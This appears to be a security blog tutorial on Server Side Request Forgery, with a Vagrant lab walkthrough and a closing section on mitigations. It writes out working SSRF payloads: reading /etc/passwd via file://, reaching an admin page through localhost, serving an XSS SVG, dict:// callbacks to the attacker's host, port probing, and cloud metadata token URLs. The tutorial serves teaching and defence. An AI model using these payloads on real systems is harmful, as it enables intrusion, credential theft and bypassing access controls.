Many web applications request outside services for data, configurations,
updates, among others. This is beneficial for the developers and
maintainers because it keeps separation of duties in their
infrastructure, one for managing the view and another for the data. When
it is done right, these applications are easier to maintain and to add
features to, but there are some intrinsic risks in getting information
through the internet using web services.

Server Side Request Forgery (SSRF) occurs when an attacker can
create requests from the vulnerable server to the internet/intranet.
Typically, the vulnerable server has a functionality that reads data
from a URL, publishes data to a URL, or imports data from a URL. An
attacker could abuse this functionality to read or update internal
resources, or bypass access controls like firewalls that prevent the
attackers from accessing them directly.

In a normal use case, the vulnerable application works like this:

<div class="imgblock">

<div class="title">

Figure 1. normal use case

</div>

</div>

1. The user requests information from an external server through the
    Web Server. For example, `GET /?url=http://external.server/data
    HTTP/1.1`

2. The server makes the request to the external server

3. If the request is to an intranet server, then it passes through the
    company firewall

4. The external server responds with the data requested, and the user
    receives it

When an attacker finds this, and he wants to bypass the firewall in
order to get internal resources, then the process of the attack is the
following:

<div class="imgblock">

<div class="title">

Figure 2. ssrf attack

</div>

</div>

1. The attacker makes the same request but modifies the payload for a
    request to another internal server, for example, `GET
    /?url=http://admin.server/users HTTP/1.1`

2. The server makes the request to the modified server

3. The request passes through the company firewall bypassing its
    measures

4. The admin server responds with the data requested by the attacker

## SSRF lab

To set up our lab, we are going to use `Hashicorp’s`
[Vagrant](https://www.vagrantup.com/); the source files are below.
Create a folder with the name `ssrf` and save the `Vagrantfile` there.

**setting up the lab.**

``` bash
$ mkdir ssrf
$ cd ssrf
ssrf$ nano Vagrantfile #Add the content here
```

**Vagrantfile.**

``` ruby
# -*- mode: ruby -*-
# vi: set ft=ruby :

Vagrant.configure("2") do |config|

  config.vm.box = "jarmasatfluid/ssrftest"
  config.vm.box_version = "1"
  config.vm.network "private_network", ip: "192.168.56.2"

end
```

Then run the environment using:

**vagrant up.**

``` bash
ssrf$ vagrant up
```

This will create a `Linux` machine with `LAMP` installed and configured.
At this point, everything we need has been completed and is ready for us
to launch an attack.

Now we can set up our attacking machine. Here we are using [Kali
Linux](https://www.kali.org/) with `Vagrant` too, but you can use
whatever `OS` you prefer.

These are the tools that we are going to use:

- [Burpsuite](https://portswigger.net/burp)

- [Netcat](http://netcat.sourceforge.net/)

- [Dirbuster](https://tools.kali.org/web-applications/dirbuster)

- [Python](https://www.python.org/)

If you are using `Kali`, then everything has already been installed by
default.

We are ready to go.

## Enumerating our server

First, we need to check the server ports. We can use `nmap` or `ncat` to
do it.

**port scanning.**

``` bash
nmap 192.168.56.2
ncat -vz 192.168.56.2 80
ncat -vz 192.168.56.2 3306
```

**nmap output.**

``` bash
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-05 13:32 SA Pacific Standard Time
Nmap scan report for 192.168.56.2
Host is up (0.00051s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
25/tcp open  smtp
80/tcp open  http
MAC Address: 08:00:27:0A:C5:08 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 10.19 seconds
```

**nc.**

``` bash
Ncat: Connected to 192.168.56.2:80.
Ncat: 0 bytes sent, 0 bytes received in 0.31 seconds.
Ncat: No connection could be made because the target machine actively refused it. .
```

Our server runs `Apache` on `port 80` and `MySQL` on `port 3306`, but we
do not have access to it.

Then using `Dirbuster`, we can search for directories on the web server.

**dirbuster.**

``` bash
$ dirb http://192.168.56.2/

As we can see, there is an admin site to which we do not have access,
and a normal site to search for products.

/>
</div>

## SSRF attacks

Given that we have access to the search products site, then we can make
a request and intercept it:

**products request.**

``` bash
POST /code/ HTTP/1.1
Host: 192.168.56.2
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 82
Origin: http://192.168.56.2
Connection: close
Referer: http://192.168.56.2/code/

product_id=5&url=http%3A%2F%2F127.0.0.1%2Fcode%2Fproducts.php%3Fproduct_id%3D&s=OK
```

There we can see that it makes a request with a URL to retrieve the
data. So, what happens when we modify the URL? Let’s change it to
`https://owasp.org/`:

**simple SSRF.**

``` text
    product_id=&url=https%3a//owasp.org/&s=OK
```

Then it will load the `OWASP` web page on our site:

<div class="imgblock">

![ssrf-vulnerable](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331135/blog/understanding-ssrf/ssrf-vulnerable_fmgfou.webp)

<div class="title">

Figure 3. ssrf vulnerable

</div>

</div>

Now we have several options to work with.

- **Reflected XSS**

  Let’s create an `SVG` image in our kali machine with an `XSS`
  payload and then serve it on a local `Python` server:

**local xss.**

``` bash
$ nano payload.svg # Put the content here
$ python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
```

**payload.svg content.**

``` text
    <?xml version="1.0" standalone="no"?>
    <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
    <svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
    <polygon id="triangle" points="0,0 0,50 50,0" fill="#FF3435" stroke="#FF3435"/>
    <script type="text/javascript">
    alert('PWNED');
    </script>
    </svg>
```

Then simply put your URL into the request and watch the result:

**SSRF to XSS payload.**

``` text
    product_id=&url=http%3a//<YOUR_IP>%3a8000/payload.svg&s=OK
```

<div class="imgblock">

![xss-vulnerable](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331135/blog/understanding-ssrf/xss_zi2u62.webp)

<div class="title">

Figure 4. SSRF to XSS result

</div>

</div>

- **Bypassing controls**

  As we saw earlier, we could not access the admin section of the
  server; this can be bypassed with this vulnerability:

**SSRF to admin payload.**

``` text
    product_id=&url=http%3A%2F%2F127.0.0.1%2Fcode%2Fadmin.php&s=OK
```

<div class="imgblock">

![control-bypass](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331135/blog/understanding-ssrf/admin_vqyfda.webp)

<div class="title">

Figure 5. SSRF to admin result

</div>

</div>

If the server had some local HTTP servers like a `mongodb` database, we
could bypass the access controls with this vulnerability.

- **Information disclosure**

  We can use `file://` to get internal files:

**file usage.**

``` text
    product_id=&url=file%3a///etc/passwd&s=OK
    ...
    <div class="row d-flex justify-content-center">
    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    sync:x:4:65534:sync:/bin:/bin/sync
    ...
```

We can also use the `dict://` URL schema to connect to a server and send
data:

**dict usage.**

``` text
    $nc -lvp 8000
    # Payload
    product_id=&url=dict%3a//<YOUR_IP>%3a8000/pwned&s=OK
    ...
    Ncat: Connection from IP:PORT.
    CLIENT libcurl 7.47.0
    pwned
    QUIT
    ...
```

This is useful when we find another vulnerable server or service,
because we can send data to it and maybe even execute commands.

- **Port enumeration**

  .port enum

<!-- end list -->

``` text
    # Port open
    product_id=&url=127.0.0.1%3a3306&s=OK
    ...
    <div class="row d-flex justify-content-center">
    5.5.5-10.0.38-MariaDB-0ubuntu0.16.04.1
    ...
    # Port closed
    ...
    <div class="row d-flex justify-content-center">
    </div>
    ...
```

- **Cloud goodies**

  If the target uses `Amazon EC2` or `Google Cloud`, then you can
  request metadata from them:

**cloud SSRF.**

``` text
    # Amazon
    http://169.254.169.254/latest/meta-data/hostname
    http://169.254.169.254/latest/user-data/
    # Google Cloud
    http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token
    http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json
```

Because the server uses `cURL`, there are some URL schemas that this
library does not support, like `ssh22`, `expect`, among others. For more
information and payloads, you can go
[here](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
or check this paper from
[OWASP](https://owasp.org/www-project-cheat-sheets/assets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet_SSRF_Bible.pdf).

## Solution

The first level of protection against this attack is to implement input
validation. It could be in the form of validating the domain name of the
target host using a whitelist. With this, if the attacker tries to
access more resources, it will be impossible for him.

Besides, if it is possible, avoid querying URLs using user input. Even
if they are hidden fields, an attacker can modify them and exploit a
SSRF vulnerability. It is better to request resources directly on the
web server whenever it is possible.

Another way to do this is to prevent the web application to access only
the resources that it will need by segregating the network. This will
prevent access to other resources in the network, but it does not work
against local access.

If you want more information about protections against SSRF, you can
check
[OWASP](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
or our [**Criteria**](https://docs.fluidattacks.com/criteria/).
